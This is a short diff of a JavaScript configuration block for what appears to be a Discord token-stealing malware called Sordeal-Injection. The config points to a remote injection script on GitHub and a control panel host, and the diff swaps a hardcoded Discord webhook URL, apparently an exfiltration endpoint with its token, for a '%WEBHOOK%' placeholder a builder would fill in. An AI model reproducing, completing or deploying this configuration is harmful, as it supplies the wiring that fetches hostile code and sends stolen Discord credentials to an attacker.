@@ -16,7 +16,7 @@ var config = {
     "embed-color": 16711718,
 
     injection_url: "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
-    webhook: "https://discord.com/api/webhooks/1086681712471322684/3pVI3lzYu7Rep46h7Zo8Txvs_dvgy7yYX3RKETqUYy3OT8abFv_BKeNKAz9kzg0cOrfh",
+    webhook: "%WEBHOOK%",
     uwu: "https://panel.sordeal.net:3000/",
     Filter: {
         "urls": [
